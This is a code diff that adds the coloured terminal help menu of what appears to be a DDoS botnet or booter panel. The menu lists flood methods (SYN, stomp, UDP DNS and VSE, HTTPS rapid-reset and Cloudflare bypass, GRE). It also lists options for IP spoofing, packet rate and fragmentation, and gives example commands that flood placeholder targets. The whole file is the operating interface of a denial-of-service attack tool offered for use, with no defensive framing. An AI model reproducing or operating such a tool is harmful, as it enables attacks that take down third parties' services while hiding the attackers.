@@ -1,0 +1,27 @@
+\033[2J\033[H\033[8;30;105t\033[38;5;231m
+ Methods\x1b[38;5;160m:\r
+\033[38;5;231m  !tcp   \x1b[38;5;160m:\033[38;5;231m TCP   [syn,ack,handshake,stomp]\x1b[38;5;160m.\r
+\033[38;5;231m  !udp   \x1b[38;5;160m:\033[38;5;231m UDP   [plain,vse,dns]\x1b[38;5;160m.\r
+\033[38;5;231m  !http  \x1b[38;5;160m:\033[38;5;231m HTTP  [cfbypass]\x1b[38;5;160m.\r
+\033[38;5;231m  !https \x1b[38;5;160m:\033[38;5;231m HTTPS [flood,cfbypass,rapidreset,browser]\x1b[38;5;160m.\r
+\033[38;5;231m  !icmp  \x1b[38;5;160m:\033[38;5;231m ICMP  [echo]\x1b[38;5;160m.\r
+\033[38;5;231m  !gre   \x1b[38;5;160m:\033[38;5;231m GRE   [ip]\x1b[38;5;160m.\r
+
+\033[38;5;231m General & Bypass Options\x1b[38;5;160m:\r
+\033[38;5;231m  mode    \x1b[38;5;160m:\033[38;5;231m Attack mode       \033[38;5;231m psize   \x1b[38;5;160m:\033[38;5;231m Packet size (max 64500)   \033[38;5;231m rand  \x1b[38;5;160m:\033[38;5;231m 0=none,1=basic,2=med,3=full\r
+\033[38;5;231m  srcport \x1b[38;5;160m:\033[38;5;231m Source port       \033[38;5;231m threads \x1b[38;5;160m:\033[38;5;231m Thread count (max 4)      \033[38;5;231m frag  \x1b[38;5;160m:\033[38;5;231m 0=none,1=DF,2=MF\r
+\033[38;5;231m  payload \x1b[38;5;160m:\033[38;5;231m Hex payload       \033[38;5;231m ttl     \x1b[38;5;160m:\033[38;5;231m Time-to-live              \033[38;5;231m tos   \x1b[38;5;160m:\033[38;5;231m Type-of-Service\r
+\033[38;5;231m  pps     \x1b[38;5;160m:\033[38;5;231m Packets/sec limit \033[38;5;231m spoof   \x1b[38;5;160m:\033[38;5;231m IP spoof (random,CIDR,range)\r
+
+\033[38;5;231m TCP & HTTP/S Options\x1b[38;5;160m:\r
+\033[38;5;231m  tcpflags  \x1b[38;5;160m:\033[38;5;231m fin,syn,rst,psh,ack,urg,ece,cwr \033[38;5;231m domain    \x1b[38;5;160m:\033[38;5;231m Target domain       \033[38;5;231m path     \x1b[38;5;160m:\033[38;5;231m Request path\r
+\033[38;5;231m  tcpopts   \x1b[38;5;160m:\033[38;5;231m Enable TCP options (0/1)        \033[38;5;231m conns     \x1b[38;5;160m:\033[38;5;231m Max connections     \033[38;5;231m method   \x1b[38;5;160m:\033[38;5;231m GET/POST/HEAD\r
+\033[38;5;231m  keepalive \x1b[38;5;160m:\033[38;5;231m Keep-alive (0/1)                \033[38;5;231m pipeline  \x1b[38;5;160m:\033[38;5;231m Pipeline depth      \033[38;5;231m postdata \x1b[38;5;160m:\033[38;5;231m POST body\r
+\033[38;5;231m  useragent \x1b[38;5;160m:\033[38;5;231m User-Agent string               \033[38;5;231m cookie    \x1b[38;5;160m:\033[38;5;231m HTTP cookie         \033[38;5;231m referer  \x1b[38;5;160m:\033[38;5;231m HTTP referer\r
+\033[38;5;231m  uarand    \x1b[38;5;160m:\033[38;5;231m Random UA (0/1)                 \033[38;5;231m randpath  \x1b[38;5;160m:\033[38;5;231m Random path (0/1)   \033[38;5;231m rate     \x1b[38;5;160m:\033[38;5;231m Req/sec (HTTPS)\r
+
+\033[38;5;231m Examples\x1b[38;5;160m:\r
+\033[38;5;231m  !tcp 1.2.3.4 80 60 mode=syn spoof=random     !http example.com 80 60 domain=example.com\r
+\033[38;5;231m  !tcp 1.2.3.4 80 60 mode=stomp conns=512      !https example.com 443 60 mode=cfbypass domain=example.com\r
+\033[38;5;231m  !udp 1.2.3.4 53 60 mode=dns                  !https example.com 443 60 mode=rapidreset domain=example.com\r
+\033[0m
